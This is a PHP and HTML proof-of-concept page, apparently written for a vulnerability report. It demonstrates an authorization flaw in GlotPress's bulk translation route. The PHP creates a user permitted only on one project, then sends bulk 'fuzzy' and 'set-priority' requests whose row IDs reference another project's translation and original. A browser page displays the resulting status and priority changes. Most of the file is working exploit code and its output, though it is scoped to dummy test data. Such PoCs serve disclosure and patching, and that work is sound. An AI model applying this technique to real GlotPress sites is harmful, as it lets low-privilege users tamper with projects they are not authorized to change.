<?php
/**
 * Browser-visible PoC harness for the GlotPress bulk action boundary issue.
 *
 * This file is intended for a private CI/dummy-data environment only. It
 * bootstraps the WordPress test environment, loads the real GlotPress plugin
 * code, creates temporary A/B objects, and invokes GP_Route_Translation.
 */

if ( isset( $_GET['mode'] ) && 'run' === $_GET['mode'] ) {
	header( 'Content-Type: application/json; charset=utf-8' );
	echo json_encode( gp_poc_run_real_route(), JSON_PRETTY_PRINT | JSON_INVALID_UTF8_SUBSTITUTE );
	exit;
}

function gp_poc_run_real_route() {
	ob_start();

	require_once dirname( __DIR__ ) . '/phpunit/bootstrap.php';

	$factory = new GP_UnitTest_Factory();
	$route   = new GP_Route_Translation();
	$route->fake_request = true;
	$route->errors       = array();
	$route->notices      = array();

	$user  = $factory->user->create();
	$set_a = $factory->translation_set->create_with_project_and_locale(
		array(),
		array(
			'name' => 'PoC Project A',
			'slug' => 'poc-project-a',
			'path' => 'poc-project-a',
		)
	);
	$set_b = $factory->translation_set->create_with_project_and_locale(
		array(),
		array(
			'name' => 'PoC Project B',
			'slug' => 'poc-project-b',
			'path' => 'poc-project-b',
		)
	);

	GP::$validator_permission->create(
		array(
			'user_id'     => $user,
			'action'      => 'approve',
			'project_id'  => $set_a->project_id,
			'locale_slug' => $set_a->locale,
			'set_slug'    => $set_a->slug,
		)
	);
	GP::$permission->create(
		array(
			'user_id'     => $user,
			'action'      => 'write',
			'object_type' => 'project',
			'object_id'   => $set_a->project_id,
		)
	);

	wp_set_current_user( $user );

	$translation_b = $factory->translation->create_with_original_for_translation_set(
		$set_b,
		array( 'status' => 'waiting' )
	);

	$original_b = $factory->original->create(
		array(
			'project_id' => $set_b->project_id,
			'priority'   => 0,
		)
	);

	$before = array(
		'translation_b_status' => $translation_b->status,
		'original_b_priority'  => (string) $original_b->priority,
	);

	$_REQUEST['_gp_route_nonce'] = wp_create_nonce( 'bulk-actions' );
	$_POST['bulk']              = array(
		'action'      => 'fuzzy',
		'row-ids'     => $translation_b->original_id . '-' . $translation_b->id,
		'redirect_to' => gp_url_project( $set_a->project ),
	);

	$route->bulk_post( $set_a->project->path, $set_a->locale, $set_a->slug );
	$translation_b_after = GP::$translation->get( $translation_b->id );

	$_REQUEST['_gp_route_nonce'] = wp_create_nonce( 'bulk-actions' );
	$_POST['bulk']              = array(
		'action'      => 'set-priority',
		'priority'    => '1',
		'row-ids'     => $original_b->id . '-0',
		'redirect_to' => gp_url_project( $set_a->project ),
	);

	$route->bulk_post( $set_a->project->path, $set_a->locale, $set_a->slug );
	$original_b_after = GP::$original->get( $original_b->id );

	$bootstrap_output = trim( ob_get_clean() );

	return array(
		'environment' => array(
			'target'  => 'GlotPress plugin loaded in WordPress test environment',
			'route'   => 'GP_Route_Translation::bulk_post()',
			'network' => 'Local CI server with dummy data only',
		),
		'user'        => array(
			'id'          => $user,
			'permissions' => 'approve/write on Project/Set A only',
		),
		'scope_a'     => array(
			'project_id' => $set_a->project_id,
			'project'    => $set_a->project->path,
			'set_id'     => $set_a->id,
			'locale'     => $set_a->locale,
			'slug'       => $set_a->slug,
		),
		'scope_b'     => array(
			'project_id'     => $set_b->project_id,
			'project'        => $set_b->project->path,
			'set_id'         => $set_b->id,
			'translation_id' => $translation_b->id,
			'original_id'    => $original_b->id,
		),
		'requests'    => array(
			array(
				'endpoint_scope' => 'Project/Set A',
				'action'         => 'fuzzy',
				'row_ids'        => $translation_b->original_id . '-' . $translation_b->id,
				'row_owner'      => 'Translation B',
			),
			array(
				'endpoint_scope' => 'Project/Set A',
				'action'         => 'set-priority',
				'row_ids'        => $original_b->id . '-0',
				'priority'       => '1',
				'row_owner'      => 'Original B',
			),
		),
		'before'      => $before,
		'after'       => array(
			'translation_b_status' => $translation_b_after->status,
			'original_b_priority'  => (string) $original_b_after->priority,
		),
		'result'      => array(
			'translation_changed' => 'waiting' !== $translation_b_after->status,
			'priority_changed'    => '0' !== (string) $original_b_after->priority,
			'conclusion'          => 'A-scoped user modified B-scoped objects through the real GlotPress bulk route.',
		),
		'bootstrap'   => $bootstrap_output,
	);
}
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Real GlotPress Dummy-Data PoC</title>
  <style>
    body {
      margin: 0;
      background: #eef2f7;
      color: #172033;
      font-family: "Segoe UI", Arial, sans-serif;
    }
    header {
      background: #172033;
      color: #fff;
      padding: 22px 34px;
      border-bottom: 5px solid #6eb245;
    }
    h1 {
      margin: 0 0 5px;
      font-size: 28px;
      letter-spacing: 0;
    }
    header p {
      margin: 0;
      color: #d7e2f4;
    }
    main {
      width: min(1280px, calc(100vw - 42px));
      margin: 22px auto;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 16px;
    }
    section {
      background: #fff;
      border: 1px solid #d9dee8;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 10px 24px rgba(23, 32, 51, .08);
    }
    h2 {
      margin: 0;
      padding: 14px 16px;
      border-bottom: 1px solid #d9dee8;
      background: #f9fbfe;
      font-size: 17px;
    }
    .body {
      padding: 16px;
    }
    .full {
      grid-column: 1 / -1;
    }
    button {
      min-height: 42px;
      padding: 10px 14px;
      border: 0;
      border-radius: 6px;
      background: #2463eb;
      color: #fff;
      font: inherit;
      font-weight: 700;
      cursor: pointer;
    }
    button:disabled {
      opacity: .55;
      cursor: wait;
    }
    .pill {
      display: inline-flex;
      align-items: center;
      border-radius: 999px;
      padding: 4px 10px;
      background: #eef5ff;
      border: 1px solid #bfdbfe;
      color: #1d4ed8;
      font-size: 13px;
      font-weight: 700;
    }
    .bad {
      background: #fff0ed;
      border-color: #ffc2ba;
      color: #b42318;
    }
    .ok {
      background: #eaf8ef;
      border-color: #acd9bb;
      color: #147a3d;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 14px;
    }
    th, td {
      text-align: left;
      padding: 10px;
      border-bottom: 1px solid #edf1f6;
      vertical-align: top;
    }
    th {
      color: #5c677d;
      font-size: 12px;
      text-transform: uppercase;
    }
    code, pre {
      font-family: Consolas, "Courier New", monospace;
    }
    code {
      background: #eef2f8;
      border-radius: 4px;
      padding: 2px 5px;
    }
    pre {
      margin: 0;
      min-height: 280px;
      max-height: 420px;
      overflow: auto;
      background: #101827;
      color: #dbeafe;
      border-radius: 8px;
      padding: 13px;
      line-height: 1.45;
      white-space: pre-wrap;
    }
    .evidence {
      display: grid;
      gap: 10px;
    }
    .row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 14px;
      border: 1px solid #d9dee8;
      border-radius: 8px;
      padding: 12px;
    }
    .changed {
      border-color: #fb923c;
      background: #fff7ed;
    }
    @media (max-width: 920px) {
      main { grid-template-columns: 1fr; }
      .full { grid-column: auto; }
    }
  </style>
</head>
<body>
  <header>
    <h1>Real GlotPress Dummy-Data PoC</h1>
    <p>This page runs the real GlotPress route in a local CI WordPress test environment. No production target is contacted.</p>
  </header>

  <main>
    <section>
      <h2>Controlled Setup</h2>
      <div class="body">
        <table>
          <tbody>
            <tr><th>Target code</th><td><code>GP_Route_Translation::bulk_post()</code></td></tr>
            <tr><th>Authorized scope</th><td>Project/Translation Set A <span class="pill ok">approve/write</span></td></tr>
            <tr><th>Protected scope</th><td>Project/Translation Set B <span class="pill bad">no permission</span></td></tr>
            <tr><th>Payload source</th><td><code>bulk[row-ids]</code> user-controlled form data</td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <section>
      <h2>Run PoC</h2>
      <div class="body evidence">
        <button id="run">Run real GlotPress PoC with dummy data</button>
        <div class="row" id="translation-row">
          <strong>Scope B translation</strong>
          <span id="translation-state" class="pill">waiting before run</span>
        </div>
        <div class="row" id="priority-row">
          <strong>Scope B original priority</strong>
          <span id="priority-state" class="pill">0 before run</span>
        </div>
      </div>
    </section>

    <section class="full">
      <h2>Server-side Result From Real GlotPress Code</h2>
      <div class="body">
        <pre id="log">Ready. Click the button to create dummy data and execute the real GlotPress bulk route.</pre>
      </div>
    </section>
  </main>

  <script>
    const run = document.getElementById("run");
    const log = document.getElementById("log");
    const translationState = document.getElementById("translation-state");
    const priorityState = document.getElementById("priority-state");
    const translationRow = document.getElementById("translation-row");
    const priorityRow = document.getElementById("priority-row");

    run.addEventListener("click", async () => {
      run.disabled = true;
      log.textContent = "Bootstrapping WordPress tests and loading real GlotPress plugin code...";

      const response = await fetch("?mode=run", { cache: "no-store" });
      const text = await response.text();
      let result;

      try {
        result = JSON.parse(text);
      } catch (error) {
        log.textContent = `PoC request returned a non-JSON response.\n\n${error}\n\nRaw response:\n${text}`;
        run.disabled = false;
        return;
      }

      if (!response.ok || !result.after || !result.before) {
        log.textContent = `PoC request failed or returned an incomplete response.\n\n${text}`;
        run.disabled = false;
        return;
      }

      translationState.textContent = `${result.before.translation_b_status} -> ${result.after.translation_b_status}`;
      priorityState.textContent = `${result.before.original_b_priority} -> ${result.after.original_b_priority}`;
      translationState.className = "pill bad";
      priorityState.className = "pill bad";
      translationRow.classList.add("changed");
      priorityRow.classList.add("changed");

      log.textContent = JSON.stringify(result, null, 2);
      run.textContent = "PoC completed against real GlotPress route";
    });
  </script>
</body>
</html>
